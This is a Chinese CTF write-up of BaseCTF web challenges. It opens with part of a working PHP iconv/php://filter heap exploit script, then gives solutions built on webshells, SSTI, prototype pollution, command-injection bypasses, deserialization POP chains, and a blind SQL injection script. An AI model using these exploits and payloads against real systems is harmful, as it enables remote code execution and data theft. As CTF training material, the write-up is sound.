        LIBC = self.info["libc"]
        ADDR_EMALLOC = LIBC.symbols["__libc_malloc"]
        ADDR_EFREE = LIBC.symbols["__libc_system"]
        ADDR_EREALLOC = LIBC.symbols["__libc_realloc"]

        ADDR_HEAP = self.info["heap"]
        ADDR_FREE_SLOT = ADDR_HEAP + 0x20
        ADDR_CUSTOM_HEAP = ADDR_HEAP + 0x0168

        ADDR_FAKE_BIN = ADDR_FREE_SLOT - 0x10

        CS = 0x100

        # Pad needs to stay at size 0x100 at every step
        pad_size = CS - 0x18
        pad = b"\x00" * pad_size
        pad = chunked_chunk(pad, len(pad) + 6)
        pad = chunked_chunk(pad, len(pad) + 6)
        pad = chunked_chunk(pad, len(pad) + 6)
        pad = compressed_bucket(pad)

        step1_size = 1
        step1 = b"\x00" * step1_size
        step1 = chunked_chunk(step1)
        step1 = chunked_chunk(step1)
        step1 = chunked_chunk(step1, CS)
        step1 = compressed_bucket(step1)

        # Since these chunks contain non-UTF-8 chars, we cannot let it get converted to
        # ISO-2022-CN-EXT. We add a `0\n` that makes the 4th and last dechunk "crash"

        step2_size = 0x48
        step2 = b"\x00" * (step2_size + 8)
        step2 = chunked_chunk(step2, CS)
        step2 = chunked_chunk(step2)
        step2 = compressed_bucket(step2)

        step2_write_ptr = b"0\n".ljust(step2_size, b"\x00") + p64(ADDR_FAKE_BIN)
        step2_write_ptr = chunked_chunk(step2_write_ptr, CS)
        step2_write_ptr = chunked_chunk(step2_write_ptr)
        step2_write_ptr = compressed_bucket(step2_write_ptr)

        step3_size = CS

        step3 = b"\x00" * step3_size
        assert len(step3) == CS
        step3 = chunked_chunk(step3)
        step3 = chunked_chunk(step3)
        step3 = chunked_chunk(step3)
        step3 = compressed_bucket(step3)

        step3_overflow = b"\x00" * (step3_size - len(BUG)) + BUG
        assert len(step3_overflow) == CS
        step3_overflow = chunked_chunk(step3_overflow)
        step3_overflow = chunked_chunk(step3_overflow)
        step3_overflow = chunked_chunk(step3_overflow)
        step3_overflow = compressed_bucket(step3_overflow)

        step4_size = CS
        step4 = b"=00" + b"\x00" * (step4_size - 1)
        step4 = chunked_chunk(step4)
        step4 = chunked_chunk(step4)
        step4 = chunked_chunk(step4)
        step4 = compressed_bucket(step4)

        # This chunk will eventually overwrite mm_heap->free_slot
        # it is actually allocated 0x10 bytes BEFORE it, thus the two filler values
        step4_pwn = ptr_bucket(
            0x200000,
            0,
            # free_slot
            0,
            0,
            ADDR_CUSTOM_HEAP,  # 0x18
            0,
            0,
            0,
            0,
            0,
            0,
            0,
            0,
            0,
            0,
            0,
            0,
            0,
            ADDR_HEAP,  # 0x140
            0,
            0,
            0,
            0,
            0,
            0,
            0,
            0,
            0,
            0,
            0,
            0,
            0,
            size=CS,
        )

        step4_custom_heap = ptr_bucket(
            ADDR_EMALLOC, ADDR_EFREE, ADDR_EREALLOC, size=0x18
        )

        step4_use_custom_heap_size = 0x140

        COMMAND = self.command
        COMMAND = f"kill -9 $PPID; {COMMAND}"
        if self.sleep:
            COMMAND = f"sleep {self.sleep}; {COMMAND}"
        COMMAND = COMMAND.encode() + b"\x00"

        assert (
                len(COMMAND) <= step4_use_custom_heap_size
        ), f"Command too big ({len(COMMAND)}), it must be strictly inferior to {hex(step4_use_custom_heap_size)}"
        COMMAND = COMMAND.ljust(step4_use_custom_heap_size, b"\x00")

        step4_use_custom_heap = COMMAND
        step4_use_custom_heap = qpe(step4_use_custom_heap)
        step4_use_custom_heap = chunked_chunk(step4_use_custom_heap)
        step4_use_custom_heap = chunked_chunk(step4_use_custom_heap)
        step4_use_custom_heap = chunked_chunk(step4_use_custom_heap)
        step4_use_custom_heap = compressed_bucket(step4_use_custom_heap)

        pages = (
                step4 * 3
                + step4_pwn
                + step4_custom_heap
                + step4_use_custom_heap
                + step3_overflow
                + pad * self.pad
                + step1 * 3
                + step2_write_ptr
                + step2 * 2
        )

        resource = compress(compress(pages))
        resource = b64(resource)
        resource = f"data:text/plain;base64,{resource.decode()}"

        filters = [
            # Create buckets
            "zlib.inflate",
            "zlib.inflate",

            # Step 0: Setup heap
            "dechunk",
            "convert.iconv.latin1.latin1",

            # Step 1: Reverse FL order
            "dechunk",
            "convert.iconv.latin1.latin1",

            # Step 2: Put fake pointer and make FL order back to normal
            "dechunk",
            "convert.iconv.latin1.latin1",

            # Step 3: Trigger overflow
            "dechunk",
            "convert.iconv.UTF-8.ISO-2022-CN-EXT",

            # Step 4: Allocate at arbitrary address and change zend_mm_heap
            "convert.quoted-printable-decode",
            "convert.iconv.latin1.latin1",
        ]
        filters = "|".join(filters)
        path = f"php://filter/read={filters}/resource={resource}"

        return path

    @inform("Triggering...")
    def exploit(self) -> None:
        path = self.build_exploit_path()
        start = time.time()

        try:
            self.remote.send(path)
        except (ConnectionError, ChunkedEncodingError):
            pass

        msg_print()

        if not self.sleep:
            msg_print("    [b white on black] EXPLOIT [/][b white on green] SUCCESS [/] [i](probably)[/]")
        elif start + self.sleep <= time.time():
            msg_print("    [b white on black] EXPLOIT [/][b white on green] SUCCESS [/]")
        else:
            # Wrong heap, maybe? If the exploited suggested others, use them!
            msg_print("    [b white on black] EXPLOIT [/][b white on red] FAILURE [/]")

        msg_print()


def compress(data) -> bytes:
    """Returns data suitable for `zlib.inflate`.
    """
    # Remove 2-byte header and 4-byte checksum
    return zlib.compress(data, 9)[2:-4]


def b64(data: bytes, misalign=True) -> bytes:
    payload = base64.encode(data)
    if not misalign and payload.endswith("="):
        raise ValueError(f"Misaligned: {data}")
    return payload.encode()


def compressed_bucket(data: bytes) -> bytes:
    """Returns a chunk of size 0x8000 that, when dechunked, returns the data."""
    return chunked_chunk(data, 0x8000)


def qpe(data: bytes) -> bytes:
    """Emulates quoted-printable-encode.
    """
    return "".join(f"={x:02x}" for x in data).upper().encode()


def ptr_bucket(*ptrs, size=None) -> bytes:
    """Creates a 0x8000 chunk that reveals pointers after every step has been ran."""
    if size is not None:
        assert len(ptrs) * 8 == size
    bucket = b"".join(map(p64, ptrs))
    bucket = qpe(bucket)
    bucket = chunked_chunk(bucket)
    bucket = chunked_chunk(bucket)
    bucket = chunked_chunk(bucket)
    bucket = compressed_bucket(bucket)

    return bucket


def chunked_chunk(data: bytes, size: int = None) -> bytes:
    """Constructs a chunked representation of the given chunk. If size is given, the
    chunked representation has size `size`.
    For instance, `ABCD` with size 10 becomes: `0004\nABCD\n`.
    """
    # The caller does not care about the size: let's just add 8, which is more than
    # enough
    if size is None:
        size = len(data) + 8
    keep = len(data) + len(b"\n\n")
    size = f"{len(data):x}".rjust(size - keep, "0")
    return size.encode() + b"\n" + data + b"\n"


@dataclass
class Region:
    """A memory region."""

    start: int
    stop: int
    permissions: str
    path: str

    @property
    def size(self) -> int:
        return self.stop - self.start


Exploit()
~~~

**分析**

- 这里不用cnext-exploits的脚本改用这个
- 直接复制粘贴就行

##### 发起攻击

```shell
python no-content.py http://challenge.imxbt.cn:32410/ "echo '<?php eval(\$_POST[0]);?>'>/var/www/html/flag.php;"
```

```shell
curl -X POST http://challenge.imxbt.cn:32410/flag.php -d "0=system('/readflag');"
```

```shell
BaseCTF{1df1a4fb-68f9-423e-a348-ff56be9778d3}
```

#### 题目答案

##### 最终脚本

```shell
no-content.py
```

##### 得到答案

```shell
BaseCTF{1df1a4fb-68f9-423e-a348-ff56be9778d3}
```



### Lucky Number

#### 题目信息

> ## Lucky Number263 pts
>
> **出题:** KonPure **难度:** 困难
>
> ------
>
> 原型链污染的大手可以伸很长的哦

#### 解题过程

##### 查看题目

```shell
http://challenge.imxbt.cn:31646/
```

```shell
都进题了，愣着干嘛，想要flag的话，那你去/flag啊！
```

```
http://challenge.imxbt.cn:31646/flag
```

```shell
你不会以为这里真的有flag吧？

想要flag的话先提交我的幸运数字5346

但是我的主人觉得我泄露了太多信息，就把我的幸运数字给删除了

但是听说在heaven中有一种create方法，配合__kwdefaults__可以创造出任何事物，你可以去/m4G1c里尝试着接触到这个方法

下面是前人留下来的信息，希望对你有用

from flask import Flask,request,render_template_string,render_template
from jinja2 import Template
import json
import heaven
def merge(src, dst):
    for k, v in src.items():
        if hasattr(dst, '__getitem__'):
            if dst.get(k) and type(v) == dict:
                merge(v, dst.get(k))
            else:
                dst[k] = v
        elif hasattr(dst, k) and type(v) == dict:
            merge(v, getattr(dst, k))
        else:
            setattr(dst, k, v)

class cls():
    def __init__(self):
        pass

instance = cls()

BLACKLIST_IN_index = ['{','}']
def is_json(data):
    try:
        json.loads(data)
        return True
    except ValueError:
        return False

@app.route('/m4G1c',methods=['POST', 'GET'])
def pollute():
    if request.method == 'POST':
        if request.is_json:
            merge(json.loads(request.data), instance)
            result = heaven.create()
            message = result["message"]
            return "这个魔术还行吧
" + message
        else:
            return "我要json的魔术"
    return "记得用POST方法把魔术交上来"


#heaven.py

def create(kon="Kon", pure="Pure", *, confirm=False):
    if confirm and "lucky_number" not in create.__kwdefaults__:
        return {"message": "嗯嗯，我已经知道你要创造东西了，但是你怎么不告诉我要创造什么？", "lucky_number": "nope"}
    if confirm and "lucky_number" in create.__kwdefaults__:
        return {"message": "这是你的lucky_number，请拿好，去/check下检查一下吧", "lucky_number": create.__kwdefaults__["lucky_number"]}

    return {"message": "你有什么想创造的吗？", "lucky_number": "nope"}
```

```shell
http://challenge.imxbt.cn:31646/m4G1c
```

```shell
记得用POST方法把魔术交上来
```

**分析**

- 我们要污染heaven类的crreate方法的\_\_kwdefaults\_\_字段的lucky_number为5346

##### 发起攻击

```python
{
    "__init__": {
        "__globals__": {
            "json":{
                "__spec__":{
                    "__init__" : {
                        "__globals__" : {
                            "sys" : {
                                "modules" : {
                                    "heaven" : {
                                        "create" : {
                                              "__kwdefaults__" : {
                                              "confirm" : true,
                                              "lucky_number" : "5346"
                                             } 
                                        }
                                    }
                                }
                            }
                        }
                    }
                }
            }
        }
    }
}
```

```shell
这个魔术还行吧
这是你的lucky_number，请拿好，去/check下检查一下吧
```

```shell
http://challenge.imxbt.cn:31646/check
```

```shell
太好了，你拿到我的幸运数字了，已经帮你把黑名单清空了，快去/ssSstTti1注入吧
```

```shell
http://challenge.imxbt.cn:31646/ssSstTti1
```

```python
{{().__class__.__base__.__subclasses__()[132].__init__.__globals__.popen("cat"+" "+"/"+"flag").read()}}
```

```shell
Hello BaseCTF{d7d66f12-0c30-4b15-b641-d0c8d6318607}
```

#### 题目答案

##### 最终脚本

```python
{
    "__init__": {
        "__globals__": {
            "json":{
                "__spec__":{
                    "__init__" : {
                        "__globals__" : {
                            "sys" : {
                                "modules" : {
                                    "heaven" : {
                                        "create" : {
                                              "__kwdefaults__" : {
                                              "confirm" : true,
                                              "lucky_number" : "5346"
                                             } 
                                        }
                                    }
                                }
                            }
                        }
                    }
                }
            }
        }
    }
}
```

##### 得到答案

```shell
BaseCTF{d7d66f12-0c30-4b15-b641-d0c8d6318607}
```



### RCE or Sql Inject

#### 题目信息

> ## RCE or Sql Inject266 pts
>
> **出题:** lazy_forever
> **难度:** 中等
>
> ------
>
> 不可能有SQL注入，RCE好像也不太可能
>
> > 本题模板来源[此处](https://github.com/CTF-Archives/ctf-docker-template/tree/main/web-lnmp-php73)，只变动了src目录，需要调试的师傅可以手动调试，包括only one sql那道题也是
>
> 
>
> R! C! E!
>
> 
>
> mysql远程连接和命令行操作是不是有些区别呢
>
> 
>
> 输个问号看看?

#### 解题过程

##### 查看题目

```php
<?php
highlight_file(__FILE__);
$sql = $_GET['sql'];
if (preg_match('/se|ec|;|@|del|into|outfile/i', $sql)) {
    die("你知道的，不可能有sql注入");
}
if (preg_match('/"|\$|`|\\\\/i', $sql)) {
    die("你知道的，不可能有RCE");
}
$query = "mysql -u root -p123456 -e \"use ctf;select 'ctfer! You can\\'t succeed this time! hahaha'; -- " . $sql . "\"";
system($query); ctfer! You can't succeed this time! hahaha ctfer! You can't succeed this time! hahaha
```

**分析**

- 过滤了一些字符可以用url编码或者/**/绕过
- 可以用换行即%0a绕过注释

##### 题目测试

```shell
?sql=%0a?
```

```shell
? (\?) Synonym for `help'. clear (\c) Clear the current input statement. connect (\r) Reconnect to the server. Optional arguments are db and host. delimiter (\d) Set statement delimiter. edit (\e) Edit command with $EDITOR. ego (\G) Send command to MariaDB server, display result vertically. exit (\q) Exit mysql. Same as quit. go (\g) Send command to MariaDB server. help (\h) Display this help. nopager (\n) Disable pager, print to stdout. notee (\t) Don't write into outfile. pager (\P) Set PAGER [to_pager]. Print the query results via PAGER. print (\p) Print current command. prompt (\R) Change your mysql prompt. quit (\q) Quit mysql. rehash (\#) Rebuild completion hash. source (\.) Execute an SQL script file. Takes a file name as an argument. status (\s) Get status information from the server. system (\!) Execute a system shell command. tee (\T) Set outfile [to_outfile]. Append everything into given outfile. use (\u) Use another database. Takes database name as argument. charset (\C) Switch to another charset. Might be needed for processing binlog with multi-byte charsets. warnings (\W) Show warnings after every statement. nowarning (\w) Don't show warnings after every statement.
```

**分析**

- 直接用system

##### 发起攻击

```shell
?sql=%0asystem+env
```

```shell
KUBERNETES_SERVICE_PORT=443 KUBERNETES_PORT=tcp://10.96.0.1:443 USER=www-data HOSTNAME=basectf2024-192f36d70a444390 PHP_INI_DIR=/usr/local/etc/php SHLVL=2 HOME=/home/www-data PHP_LDFLAGS=-Wl,-O1 -pie PHP_CFLAGS=-fstack-protector-strong -fpic -fpie -O2 -D_LARGEFILE_SOURCE -D_FILE_OFFSET_BITS=64 PHP_VERSION=7.3.33 GPG_KEYS=CBAF69F173A0FEA4B537F470D66C9593118BCCB6 F38252826ACD957EF380D39F2F7956BC5DA04B5D PHP_ASC_URL=https://www.php.net/distributions/php-7.3.33.tar.xz.asc PHP_CPPFLAGS=-fstack-protector-strong -fpic -fpie -O2 -D_LARGEFILE_SOURCE -D_FILE_OFFSET_BITS=64 _=/usr/local/sbin/php-fpm PHP_URL=https://www.php.net/distributions/php-7.3.33.tar.xz KUBERNETES_PORT_443_TCP_ADDR=10.96.0.1 PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin KUBERNETES_PORT_443_TCP_PORT=443 KUBERNETES_PORT_443_TCP_PROTO=tcp GZCTF_FLAG=BaseCTF{97106c42-5491-4266-a36a-72d1f47b6f14} KUBERNETES_SERVICE_PORT_HTTPS=443 KUBERNETES_PORT_443_TCP=tcp://10.96.0.1:443 PWD=/var/www/html PHPIZE_DEPS=autoconf dpkg-dev dpkg file g++ gcc libc-dev make pkgconf re2c KUBERNETES_SERVICE_HOST=10.96.0.1 PHP_SHA256=166eaccde933381da9516a2b70ad0f447d7cec4b603d07b9a916032b215b90cc GZCTF_TEAM_ID=3440 ctfer! You can't succeed this time! hahaha
```

#### 题目答案

##### 最终payload

```shell
?sql=%0asystem+env
```

##### 得到答案

```shell
BaseCTF{97106c42-5491-4266-a36a-72d1f47b6f14}
```



### RCEisamazingwithspace

#### 题目信息

> ## RCEisamazingwithspace250 pts
>
> **出题:** Kengwang
> **难度:** 简单
>
> ------
>
> RCEisreallingamazingwithoutaspacesoyoushouldfindoutawaytoreplacespace

#### 解题过程

##### 查看题目

```php
<?php
highlight_file(__FILE__);
$cmd = $_POST['cmd'];
// check if space is present in the command
// use of preg_match to check if space is present in the command
if (preg_match('/\s/', $cmd)) {
    echo 'Space not allowed in command';
    exit;
}

// execute the command
system($cmd);
```

**分析**

- 用$IFS替代空格

##### 编写payload

```shell
cmd=cat$IFS/f*
```

```shell
BaseCTF{a6f650f7-f84a-4943-84f8-7d3406952b25}
```

#### 题目答案

##### 最终payload

```
cmd=cat$IFS/f*
```

##### 题目答案

```shell
BaseCTF{a6f650f7-f84a-4943-84f8-7d3406952b25}
```



### Really EZ POP

##### 题目信息

> ## Really EZ POP250 pts
>
> **出题:** Kengwang
> **难度:** 简单
>
> ------
>
> 你已经学会反序列化了，接下来尝试手动构造 POP 链吧！
>
> 
>
> 请注意 PHP 版本为 5.6.40, 反序列化不会忽略成员变量可访问性
>
> 
>
> !!不要使用!! FireFox 的 Hackbar 发送 Payload, 可能你输入是正确的, 但是没有回显

#### 解题过程

##### 查看题目

```php
<?php
highlight_file(__FILE__);

class Sink
{
    private $cmd = 'echo 123;';
    public function __toString()
    {
        eval($this->cmd);
    }
}

class Shark
{
    private $word = 'Hello, World!';
    public function __invoke()
    {
        echo 'Shark says:' . $this->word;
    }
}

class Sea
{
    public $animal;
    public function __get($name)
    {
        $sea_ani = $this->animal;
        echo 'In a deep deep sea, there is a ' . $sea_ani();
    }
}

class Nature
{
    public $sea;

    public function __destruct()
    {
        echo $this->sea->see;
    }
}

if ($_POST['nature']) {
    $nature = unserialize($_POST['nature']);
}
```

**分析**

- POP
- 注意私有变量要用反射修改值

##### 编写脚本

```php
<?php

class Sink
{
    private $cmd = "system('cat /f*');";
}

class Shark
{
    private $word;
}

class Sea
{
    public $animal;
}

class Nature
{
    public $sea;
}

$sink = new Sink();

$shark = new Shark();
$sharkReflectionClass = new ReflectionClass('Shark');
$wordSharkProperty = $sharkReflectionClass->getProperty('word');
$wordSharkProperty->setAccessible(true);
$wordSharkProperty->setValue($shark, $sink);

$sea = new Sea();
$sea->animal = $shark;

$nature = new Nature();
$nature->sea = $sea;

echo urlencode(serialize($nature));
```

##### 发起攻击

```shell
POST nature=O%3A6%3A%22Nature%22%3A1%3A%7Bs%3A3%3A%22sea%22%3BO%3A3%3A%22Sea%22%3A1%3A%7Bs%3A6%3A%22animal%22%3BO%3A5%3A%22Shark%22%3A1%3A%7Bs%3A11%3A%22%00Shark%00word%22%3BO%3A4%3A%22Sink%22%3A1%3A%7Bs%3A9%3A%22%00Sink%00cmd%22%3Bs%3A18%3A%22system%28%27cat+%2Ff%2A%27%29%3B%22%3B%7D%7D%7D%7D
```

```shell
BaseCTF{640eb439-ae40-4cfa-a1da-c8b859e531d1}
```

#### 题目答案

##### 最终脚本

```php
<?php

class Sink
{
    private $cmd = "system('cat /f*');";
}

class Shark
{
    private $word;
}

class Sea
{
    public $animal;
}

class Nature
{
    public $sea;
}

$sink = new Sink();

$shark = new Shark();
$sharkReflectionClass = new ReflectionClass('Shark');
$wordSharkProperty = $sharkReflectionClass->getProperty('word');
$wordSharkProperty->setAccessible(true);
$wordSharkProperty->setValue($shark, $sink);

$sea = new Sea();
$sea->animal = $shark;

$nature = new Nature();
$nature->sea = $sea;

echo urlencode(serialize($nature));
```

##### 得到答案

```shell
BaseCTF{640eb439-ae40-4cfa-a1da-c8b859e531d1}
```



### Sql Inject or RCE

#### 题目信息

> ## Sql Inject or RCE318 pts
>
> **出题:** lazy_forever
> **难度:** 中等
>
> ------
>
> 不可能有RCE，SQL注入好像也不太可能
>
> > 本题模板来源[此处](https://github.com/CTF-Archives/ctf-docker-template/tree/main/web-lnmp-php73)，只变动了src目录，需要调试的师傅可以手动调试

##### 解题过程

##### 查看题目

```php
<?php
highlight_file(__FILE__);
$sql = $_GET['sql'];
if (preg_match('/se|ec|st|;|@|delete|into|outfile/i', $sql)) {
    die("你知道的，不可能有sql注入");
}
if (preg_match('/"|\$|`|\\\\/i', $sql)) {
    die("你知道的，不可能有RCE");
}
$query = "mysql -u root -p123456 -e \"use ctf;select 'ctfer! You can\\'t succeed this time! hahaha'; -- " . $sql . "\"";
system($query);
```

**分析**

- 过滤了system
- 注意到和之前的题目比较，del变成了delete，怀疑题解与del有关

##### 编写payload

```shell
?sql=%0adelimiter //%0ahandler flag open//handler flag read next
```

##### 发起攻击

```shell
ctfer! You can't succeed this time! hahaha ctfer! You can't succeed this time! hahaha id data flag BaseCTF{0f0fadfa-fd1d-4aad-828e-6e6f8b033ebe}
```

#### 题目答案

##### 最终payload

```shell
?sql=%0adelimiter //%0ahandler flag open//handler flag read next
```

##### 题目答案

```shell
BaseCTF{0f0fadfa-fd1d-4aad-828e-6e6f8b033ebe}
```



### ez_php_jail

#### 题目信息

> ## ez_php_jail250 pts
>
> **出题:Delete** **难度:中等**
>
> ------
>
> DT最怕坐牢了...但是包吃包住啊！

#### 解题过程

##### 查看题目

```php
<?php
highlight_file(__FILE__);
error_reporting(0);
include("hint.html");
$Jail = $_GET['Jail_by.Happy'];

if($Jail == null) die("Do You Like My Jail?");

function Like_Jail($var) {
    if (preg_match('/(`|\$|a|c|s|require|include)/i', $var)) {
        return false;
    }
    return true;
}

if (Like_Jail($Jail)) {
    eval($Jail);
    echo "Yes! you escaped from the jail! LOL!";
} else {
    echo "You will Jail in your life!";
}
echo "\n";

// 在HTML解析后再输出PHP源代码

?>
```

**分析**

- Jail_by.Happy -> Jail[by.Happy

##### 编写payload

```shell
?Jail[by.Happy=highlight_file(glob("/f*")[0]);
```

##### 发起攻击

```shell
BaseCTF{7a30bb04-291c-4ab0-8865-d25bb07e349b}
Yes! you escaped from the jail! LOL!
```

#### 题目答案

##### 最终payload

```shell
?Jail[by.Happy=highlight_file(glob("/f*")[0]);
```

##### 得到答案

```
BaseCTF{7a30bb04-291c-4ab0-8865-d25bb07e349b}
```



### ez_ser

#### 题目信息

> ## ez_ser250 pts
>
> **出题:** Delete
> **难度:** 入门
>
> ------
>
> 简单的反序列化入门，喵喵喵

#### 解题过程

##### 查看题目

```php
<?php
highlight_file(__FILE__);
error_reporting(0);

class re{
    public $chu0;
    public function __toString(){
        if(!isset($this->chu0)){
            return "I can not believes!";
        }
        $this->chu0->$nononono;
    }
}

class web {
    public $kw;
    public $dt;

    public function __wakeup() {
        echo "lalalla".$this->kw;
    }

    public function __destruct() {
        echo "ALL Done!";
    }
}

class pwn {
    public $dusk;
    public $over;

    public function __get($name) {
        if($this->dusk != "gods"){
            echo "什么，你竟敢不认可?";
        }
        $this->over->getflag();
    }
}

class Misc {
    public $nothing;
    public $flag;

    public function getflag() {
        eval("system('cat /flag');");
    }
}

class Crypto {
    public function __wakeup() {
        echo "happy happy happy!";
    }

    public function getflag() {
        echo "you are over!";
    }
}
$ser = $_GET['ser'];
unserialize($ser);
?>
```

**分析**

- 序列化POP

##### 编写脚本

```php
<?php

class re{
    public $chu0;
}

class web {
    public $kw;
    public $dt;
}

class pwn {
    public $dusk;
    public $over;
}

class Misc {
    public $nothing;
    public $flag;
}

class Crypto {

}

$misc = new Misc();

$pwn = new pwn();
$pwn->dusk = "gods";
$pwn->over = $misc;

$re = new re();
$re->chu0 = $pwn;

$web = new web();
$web->kw = $re;

echo urlencode(serialize($web));
```

```shell
O%3A3%3A%22web%22%3A2%3A%7Bs%3A2%3A%22kw%22%3BO%3A2%3A%22re%22%3A1%3A%7Bs%3A4%3A%22chu0%22%3BO%3A3%3A%22pwn%22%3A2%3A%7Bs%3A4%3A%22dusk%22%3Bs%3A4%3A%22gods%22%3Bs%3A4%3A%22over%22%3BO%3A4%3A%22Misc%22%3A2%3A%7Bs%3A7%3A%22nothing%22%3BN%3Bs%3A4%3A%22flag%22%3BN%3B%7D%7D%7Ds%3A2%3A%22dt%22%3BN%3B%7D
```

##### 发起攻击

```shell
?ser=O%3A3%3A%22web%22%3A2%3A%7Bs%3A2%3A%22kw%22%3BO%3A2%3A%22re%22%3A1%3A%7Bs%3A4%3A%22chu0%22%3BO%3A3%3A%22pwn%22%3A2%3A%7Bs%3A4%3A%22dusk%22%3Bs%3A4%3A%22gods%22%3Bs%3A4%3A%22over%22%3BO%3A4%3A%22Misc%22%3A2%3A%7Bs%3A7%3A%22nothing%22%3BN%3Bs%3A4%3A%22flag%22%3BN%3B%7D%7D%7Ds%3A2%3A%22dt%22%3BN%3B%7D
```

```shell
BaseCTF{a7898d44-ec20-484e-a640-bd3b09051ea5}
```

#### 题目答案

##### 最终脚本

```php
<?php

class re{
    public $chu0;
}

class web {
    public $kw;
    public $dt;
}

class pwn {
    public $dusk;
    public $over;
}

class Misc {
    public $nothing;
    public $flag;
}

class Crypto {

}

$misc = new Misc();

$pwn = new pwn();
$pwn->dusk = "gods";
$pwn->over = $misc;

$re = new re();
$re->chu0 = $pwn;

$web = new web();
$web->kw = $re;

echo urlencode(serialize($web));
```

##### 得到答案

```shell
BaseCTF{a7898d44-ec20-484e-a640-bd3b09051ea5}
```



### md5绕过欸

#### 题目信息

> ## md5绕过欸250 pts
>
> **出题:** ClearWine
> **难度:** 入门
>
> ------
>
> 绕哇绕哇绕

#### 解题过程

##### 查看题目

```php
<?php
highlight_file(__FILE__);
error_reporting(0);
require 'flag.php';

if (isset($_GET['name']) && isset($_POST['password']) && isset($_GET['name2']) && isset($_POST['password2']) ){
    $name = $_GET['name'];
    $name2 = $_GET['name2'];
    $password = $_POST['password'];
    $password2 = $_POST['password2'];
    if ($name != $password && md5($name) == md5($password)){
        if ($name2 !== $password2 && md5($name2) === md5($password2)){
            echo $flag;
        }
        else{
            echo "再看看啊，马上绕过嘞！";
        }
    }
    else {
        echo "错啦错啦";
    }

}
else {
    echo '没看到参数呐';
}
```

**分析**

- MD5绕过，可用数组

##### 编写payload

```shell
http://challenge.imxbt.cn:32149/
GET name[]=1&name2[]=3
POST password[]=2&password2[]=4
```

##### 发起攻击

```shell
BaseCTF{23d20e00-b57c-43db-9196-e1ade2dcdff0}
```

#### 题目答案

##### 最终payload

```shell
http://challenge.imxbt.cn:32149/
GET name[]=1&name2[]=3
POST password[]=2&password2[]=4
```

##### 得到答案

```shell
BaseCTF{23d20e00-b57c-43db-9196-e1ade2dcdff0}
```



### only one sql

#### 题目信息

> ## only one sql257 pts
>
> **出题:** lazy_forever
> **难度:** 中等
>
> ------
>
> 只可以一句哦
> 使用BaseCTF{}格式
>
> 
>
> 既然没有select无法直接查看flag，有没有其他方式来推断flag呢，比如布尔，比如时间？

#### 解题过程

##### 查看题目

```php
<?php
highlight_file(__FILE__);
$sql = $_GET['sql'];
if (preg_match('/select|;|@|\n/i', $sql)) {
    die("你知道的，不可能有sql注入");
}
if (preg_match('/"|\$|`|\\\\/i', $sql)) {
    die("你知道的，不可能有RCE");
}
//flag in ctf.flag
$query = "mysql -u root -p123456 -e \"use ctf;select '没有select，让你执行一句又如何';" . $sql . "\"";
system($query);
```

**分析**

- 题目提示时间盲注，先找一下注入点

##### 漏洞测试

```shell
GET sql=show columns from flag
```

```shell
Field Type Null Key Default Extra id varchar(300) YES NULL data varchar(300) YES NULL
```

**分析**

- 猜测flag在data处

##### 编写脚本

```python
import string
import requests

url = "http://challenge.imxbt.cn:31761/?sql=delete from flag where data like '{}%' and sleep(4)"
alphabet = string.ascii_lowercase + string.ascii_uppercase + string.digits + "{}" + '-'

flag = ""
while True:
    if flag.endswith('}'):
        break

    for c in alphabet:
        try:
            r = requests.get(url.format(flag + c), timeout=3)
        except:
            flag += c
            print(flag)
            break
```

##### 发起攻击

```shell
basectf{a182fZFUlwYw...}
```

#### 题目答案

##### 最终脚本

```python
import string
import requests

url = "http://challenge.imxbt.cn:31761/?sql=delete from flag where data like '{}%' and sleep(4)"
alphabet = string.ascii_lowercase + string.ascii_uppercase + string.digits + "{}" + '-'

flag = ""
while True:
    if flag.endswith('}'):
        break

    for c in alphabet:
        try:
            r = requests.get(url.format(flag + c), timeout=3)
        except:
            flag += c
            print(flag)
            break
```

##### 得到答案

```shell
basectf{a182fZFUlwYw...}
```



### upload

##### 题目信息

> ## upload250 pts
>
> **出题:** Kengwang
> **难度:** 入门
>
> ------
>
> 快来上传你最喜欢的照片吧~ 等下,这个 php 后缀的照片是什么?

#### 解题过程

##### 查看题目

```html
<?php
error_reporting(0);
if (isset($_FILES['file'])) {
    highlight_file(__FILE__);
    $file = $_FILES['file'];
    $filename = $file['name'];
    $filetype = $file['type'];
    $filesize = $file['size'];
    $filetmp = $file['tmp_name'];
    $fileerror = $file['error'];

    if ($fileerror === 0) {
        $destination = 'uploads/' . $filename;
        move_uploaded_file($filetmp, $destination);
        echo 'File uploaded successfully';
    } else {
        echo 'Error uploading file';
    }
}
?>
<!DOCTYPE html>
<html lang="en">

<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>上传你喜欢的图片吧！</title>
</head>

<body>
    <form action="" method="post" enctype="multipart/form-data">
        <input type="file" name="file">
        <button type="submit">上传！</button>
    </form>
    <?php
    $files = scandir('uploads');
    foreach ($files as $file) {
        if ($file === '.' || $file === '..') {
            continue;
        }
        echo "<img src='uploads/$file' style=\"max-height: 200px;\" />";
    }
    ?>
</body>

</html>
```

**分析**

- 文件上传漏洞

##### 编写脚本

```php
<?=`cat /f*`;
```

##### 发起攻击

```shell
http://challenge.imxbt.cn:32106/uploads/php.php
```

```shell
BaseCTF{d553638d-fb9e-4637-b77b-3a3a7e22cb4a}
```

#### 题目答案

##### 最终脚本

```php
<?=`cat /f*`;
```

##### 得到答案

```shell
BaseCTF{d553638d-fb9e-4637-b77b-3a3a7e22cb4a}
```



### 一起吃豆豆

#### 题目信息

> ## 一起吃豆豆250 pts
>
> **出题:** Goku
> **难度:** 简单
>
> ------
>
> 大家都爱玩的JS小游戏

#### 解题过程

##### 查看源码

**index.js**

```js
context.fillText(_LIFE ? atob("QmFzZUNURntKNV9nYW0zXzFzX2Vhc3lfdDBfaDRjayEhfQ==") : 'GAME OVER', this.x, this.y);
```

##### 解码密文

```shell
QmFzZUNURntKNV9nYW0zXzFzX2Vhc3lfdDBfaDRjayEhfQ
```

```shell
BaseCTF{J5_gam3_1s_easy_t0_h4ck!!}
```

#### 题目答案

##### 得到答案

```shell
BaseCTF{J5_gam3_1s_easy_t0_h4ck!!}
```



#### 你听不到我的声音

##### 题目信息

> ## 你听不到我的声音250 pts
>
> **出题:** Kengwang
> **难度:** 简单
>
> ------
>
> 我要执行 shell 指令啦! 诶? 他的输出是什么? 为什么不给我?

#### 解题过程

##### 查看题目

```php
<?php
highlight_file(__FILE__);
shell_exec($_POST['cmd']);
```

**分析**

- 无回显

##### 方法一

###### 编写payload

```shell
cmd=cat /f* > txt.txt
```

##### 方法二

